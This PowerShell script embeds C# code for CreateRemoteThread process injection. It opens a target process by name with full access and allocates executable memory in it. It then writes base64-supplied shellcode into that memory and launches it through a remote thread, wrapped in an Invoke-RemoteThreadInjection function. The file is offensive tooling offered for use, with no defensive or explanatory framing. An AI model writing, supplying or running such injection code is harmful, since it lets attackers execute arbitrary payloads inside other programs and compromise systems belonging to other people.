# Load the necessary assemblies
Add-Type -AssemblyName System.IO.Compression
Add-Type -AssemblyName System.IO.Compression.FileSystem
Add-Type -AssemblyName System.Security

# C# code for CreateRemoteThread Injection
$remoteThreadInjectionCode = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class RemoteThreadInjection
{
    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);

    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport(\"kernel32.dll\", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    public static void Inject(string processName, byte[] shellcode)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        if (processes.Length == 0)
        {
            throw new Exception(\"Process not found.\");
        }
        Process process = processes[0];

        IntPtr hProcess = OpenProcess(0x001F0FFF, false, process.Id);
        if (hProcess == IntPtr.Zero)
        {
            throw new Exception(\"Failed to open process.\");
        }

        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        if (addr == IntPtr.Zero)
        {
            throw new Exception(\"Failed to allocate memory.\");
        }

        if (!WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out UIntPtr bytesWritten))
        {
            throw new Exception(\"Failed to write memory.\");
        }

        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out IntPtr threadId);
        if (hThread == IntPtr.Zero)
        {
            throw new Exception(\"Failed to create remote thread.\");
        }
    }
}
"@

# Add the C# code to PowerShell
Add-Type -TypeDefinition $remoteThreadInjectionCode -Language CSharp

function Invoke-RemoteThreadInjection {
    param (
        [string]$ProcessName,
        [string]$ShellcodeBase64
    )

    $shellcode = [Convert]::FromBase64String($ShellcodeBase64)
    [RemoteThreadInjection]::Inject($ProcessName, $shellcode)
}
